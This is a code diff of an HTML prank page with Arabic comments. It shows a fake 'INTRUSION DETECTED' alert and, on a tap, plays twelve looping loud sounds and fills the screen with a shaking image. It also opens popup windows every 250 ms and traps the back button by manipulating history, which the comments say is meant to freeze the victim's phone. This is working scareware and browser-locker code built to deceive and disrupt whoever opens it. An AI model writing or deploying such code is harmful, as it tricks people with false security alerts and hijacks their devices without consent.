@@ -3,79 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM FAILURE ⚠️</title>
+    <title>⚠️ WARNING: UNSTABLE ENTITY ⚠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة: رعشة هستيرية مع قلب الألوان سواسوة */
+        /* صورة المرأة: واضحة تماماً (نحينا الضبابة والفلتر الرمادي) سواسوة */
         #stalkerEntity { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 1; display: none;
-            filter: contrast(400%) brightness(20%);
-            animation: seizure 0.02s infinite; 
+            /* نحينا contrast و grayscale سواسوة */
+            will-change: transform; /* لتحسين الأداء سواسوة */
         }
 
-        @keyframes seizure {
-            0% { transform: translate(5px, 5px); filter: invert(0); }
-            50% { transform: translate(-5px, -8px); filter: invert(0.3) hue-rotate(180deg); }
-            100% { transform: translate(3px, 5px); }
-        }
-
-        #errorBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; background: rgba(0,0,0,0.9); padding: 30px; border: 3px solid #f00; box-shadow: 0 0 20px #f00; }
+        #ui { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #f00; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
-        .btn-red { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.3em; margin-top: 20px; }
+        button { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.3em; margin-top: 15px; }
     </style>
 </head>
-<body onclick="launchChaos()">
+<body onclick="launchNightmare()">
 
-    <div id="errorBox">
-        <h1 class="blink">☠️ SYSTEM OVERLOAD ☠️</h1>
-        <p>CRITICAL ERROR: Device memory corrupted.<br>Tap to initiate emergency repair.</p>
-        <button class="btn-red">REPAIR NOW</button>
+    <div id="ui">
+        <h1 class="blink">☠️ INTRUSION DETECTED ☠️</h1>
+        <p>System stability compromised.<br>Tap to contain the threat.</p>
+        <button>CONTAIN</button>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="audioLayer">
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
+    <div id="audios">
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
     </div>
 
     <script>
-        function launchChaos() {
-            // تشغيل الـ 12 صوت في رحبة سواسوة
-            document.querySelectorAll('.h').forEach(a => {
-                a.volume = 1.0;
-                a.play();
-                a.addEventListener('ended', function() { this.currentTime = 0; this.play(); }, false);
-            });
+        let audioContext;
+        let analyser;
+        let dataArray;
+        const img = document.getElementById('stalkerEntity');
 
-            document.getElementById('errorBox').style.display = 'none';
-            document.getElementById('stalkerEntity').style.display = 'block';
-            
-            // طلب الشاشة الكاملة سواسوة
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
+        function launchNightmare() {
+            // تشغيل الـ 12 صوت وضمان التكرار الأبدي سواسوة
+            document.querySelectorAll('.s').forEach(a => { a.volume = 1.0; a.play(); a.addEventListener('ended', function() { this.currentTime = 0; this.play(); }); });
 
-            // محاكاة اللاق البصري سواسوة (إيهام الضحية بالتعليق)
-            setInterval(() => {
-                console.log("Simulating CPU Stress...");
-                history.pushState(null, null, window.location.href);
-            }, 100);
+            document.getElementById('ui').style.display = 'none';
+            img.style.display = 'block';
+            document.documentElement.requestFullscreen();
+
+            // نظام "الحبس واللاق" لتبليك الهاتف سواسوة
+            setInterval(() => { window.open(window.location.href, '_blank', 'width=10,height=10'); history.pushState(null, null, window.location.href); }, 250);
+
+            // تفعيل نظام الحركة مع الصوت سواسوة
+            setupSoundReactiveVisuals();
         }
+
         window.onpopstate = () => history.go(1);
+
+        function setupSoundReactiveVisuals() {
+            // 1. إنشاء الـ AudioContext ونقل الصوت إليه سواسوة
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            
+            // نأخذ الصوت الأول كمرجع (مثلاً "التوحويح" سواسوة)
+            const firstAudio = document.querySelector('.s'); 
+            const source = audioContext.createMediaElementSource(firstAudio);
+            
+            // 2. إنشاء الـ Analyser لتحليل الترددات سواسوة
+            analyser = audioContext.createAnalyser();
+            analyser.fftSize = 256;
+            dataArray = new Uint8Array(analyser.frequencyBinCount);
+
+            // 3. ربط المصدر بالـ Analyser وبالسماعات سواسوة
+            source.connect(analyser);
+            analyser.connect(audioContext.destination);
+
+            // 4. دالة الرسم (التحديث المستمر) سواسوة
+            requestAnimationFrame(visualizeMadness);
+        }
+
+        function visualizeMadness() {
+            if (!analyser || img.style.display === 'none') return;
+            
+            // جلب بيانات الترددات الحالية سواسوة
+            analyser.getByteFrequencyData(dataArray);
+            
+            // حساب "قوة" الصوت الإجمالية سواسوة
+            let average = 0;
+            for (let i = 0; i < dataArray.length; i++) {
+                average += dataArray[i];
+            }
+            average = average / dataArray.length; // القوة بين 0 و 255 سواسوة
+
+            // 5. تطبيق ميزة "المجنونة": الرعشة والتكبير سواسوة
+            const shake = (average / 255) * 40; // الرعشة بين 0px و 40px سواسوة
+            const scale = 1 + (average / 255) * 0.15; // التكبير بين 1.0 و 1.15 سواسوة
+            
+            // تطبيق التحول سواسوة
+            img.style.transform = `translate(${Math.random() * shake}px, ${Math.random() * shake}px) scale(${scale})`;
+            
+            // طلب التحديث التالي سواسوة
+            requestAnimationFrame(visualizeMadness);
+        }
     </script>
 </body>
 </html>
